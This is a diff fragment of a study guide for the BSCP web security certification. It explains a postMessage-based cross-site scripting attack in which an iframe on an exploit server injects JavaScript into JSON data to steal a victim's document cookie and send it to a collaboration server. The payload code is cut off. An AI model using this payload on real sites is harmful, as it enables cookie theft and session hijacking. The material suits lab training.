@@ -68,7 +68,7 @@ The acronym BSCP has nice simular ring like OSCP  :)
 >To exploit above the above code, inject JavaScript into the JSON data to change "load-channel" field data steal document cookie.  
 
   
->Hosted **iframe** on exploit server html body.  
+>Hosted **iframe** on exploit server html body, to send the victim cookie to the collaboration server.  
 
 ```html
 <iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
